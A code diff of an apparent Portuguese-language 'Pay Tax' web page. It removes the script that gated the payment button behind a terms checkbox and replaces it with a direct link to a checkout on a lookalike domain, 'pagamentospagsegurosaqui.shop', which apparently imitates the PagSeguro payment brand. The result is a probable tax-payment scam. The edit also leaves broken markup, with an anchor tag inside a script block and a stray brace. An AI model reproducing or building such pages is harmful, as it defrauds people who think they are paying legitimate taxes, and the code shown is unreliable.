@@ -474,35 +474,9 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
 <a id="paymentButton" href="#" class="btn33" onclick="handleButtonClick(event)">Pagar Imposto</a>
 
 <script>
-    function toggleButton() {
-        const checkbox = document.getElementById('termsCheckbox');
-        const button = document.getElementById('paymentButton');
-        if (checkbox.checked) {
-            button.classList.add('enabled');
-            button.setAttribute('data-enabled', 'true');
-        } else {
-            button.classList.remove('enabled');
-            button.setAttribute('data-enabled', 'false');
-        }
-    }
 
-    function getURLParameters() {
-        const params = new URLSearchParams(window.location.search);
-        return params.toString() ? '?' + params.toString() : '';
-    }
+     <a id="paymentButton" href="https://pay.pagamentospagsegurosaqui.shop/checkout/723d3483-9708-4de5-8adc-baf05e95afc7" class="btn33 enabled">Pagar Imposto</a>
 
-    function handleButtonClick(event) {
-        const button = event.currentTarget;
-        const isEnabled = button.getAttribute('data-enabled') === 'true';
-
-        if (!isEnabled) {
-            event.preventDefault(); // Impede a navegação
-            alert("Você precisa aceitar os termos antes de prosseguir.");
-        } else {
-            // Redireciona preservando os parâmetros da URL atual
-            const currentParams = getURLParameters();
-            window.location.href = `https://pay.pagamentospagsegurosaqui.shop/checkout/723d3483-9708-4de5-8adc-baf05e95afc7${currentParams}`;
-        }
     }
 </script>
 				</div>
